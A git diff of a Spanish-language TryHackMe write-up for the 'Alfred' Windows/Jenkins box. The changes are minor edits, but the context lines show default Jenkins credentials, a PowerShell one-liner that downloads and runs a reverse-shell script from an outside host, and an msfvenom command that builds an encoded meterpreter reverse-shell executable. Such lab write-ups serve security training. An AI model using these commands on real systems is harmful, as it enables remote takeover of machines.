@@ -1,5 +1,5 @@
 ---
-tags: [tryhackme, windows, jenkins, privesc]
+tags: [tryhackme, windows, jenkins]
 ---
 
 # Alfred
@@ -52,7 +52,7 @@ Credenciales por defecto `admin:admin`
 
 ![alt text](img/image-14.png)
 
-Agregar la sigueinte linea de código
+Agregar la siguiente linea de código
 
 ```powershell
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.244.36:8282/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.244.36 -Port 1234
@@ -77,7 +77,7 @@ PS C:\Users\bruce\Desktop> type user.txt
 
 ## Privilege Escalation
 
-```bash
+```bash title="revshell.exe"
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.244.36 LPORT=5555 -f exe -o revshell.exe   
 ```
 
